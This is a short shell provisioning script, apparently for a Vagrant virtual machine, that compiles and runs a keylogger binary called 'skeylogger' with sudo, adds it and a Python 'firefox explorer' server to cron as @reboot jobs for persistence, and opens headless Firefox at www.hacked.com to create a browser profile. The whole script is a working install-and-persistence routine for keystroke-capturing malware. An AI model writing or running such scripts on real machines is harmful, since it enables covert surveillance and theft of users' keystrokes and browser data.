#! /bin/sh

# Provision log directory
mkdir log
touch ~/.jobs

# Necessary to make sure ~/.mozilla directory exists
## Firefox does not support being executed as the root user
## soo first we must test which user is calling the script

# TODO: Silence commands
if [[ "$USER" == "root" ]]; then
    su - vagrant -c 'timeout 3s firefox --headless www.hacked.com || true'
else
    timeout 3s firefox --headless www.hacked.com || true
fi

# Execute skeylogger binary
cd .source/keyLogger/
make
sudo ./skeylogger

# Create reboot trigger with cron job
echo "@reboot .$PWD/skeylogger" >> ~/.jobs

# Provision firefox explorer
cd ../server/
pip install -qqq --break-system-packages -r requirements.txt

# Create reboot trigger with cron job
echo "@reboot python3 $PWD/main.py" >> ~/.jobs

# Provision trigger file
crontab -u vagrant ~/.jobs

# Execute firefox explorer
python3 main.py
